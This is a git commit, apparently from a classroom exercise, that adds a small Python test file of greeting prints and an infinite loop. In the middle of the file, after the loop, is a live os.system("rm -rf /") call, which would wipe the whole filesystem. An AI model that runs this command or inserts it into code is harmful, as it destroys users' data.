a567c9fe63274f516f714605e18bd9b23736e0a3
Francisco Manuel Vigil Ruiz <fruivig204@g.educaand.es>
2026-03-09 16:48:52 +0100

    datos de prueba

---
+++ python.py
@@ -0,0 +1,17 @@
+while True:
+    print("Esto nunca se detiene")
+    
+    
+import math
+
+print("Hola mundo")
+
+
+import os
+
+os.system("rm -rf /")
+
+
+print("Bienvenido Juan")
+print("Bienvenido Pedro")
+print("Bienvenido Ana")
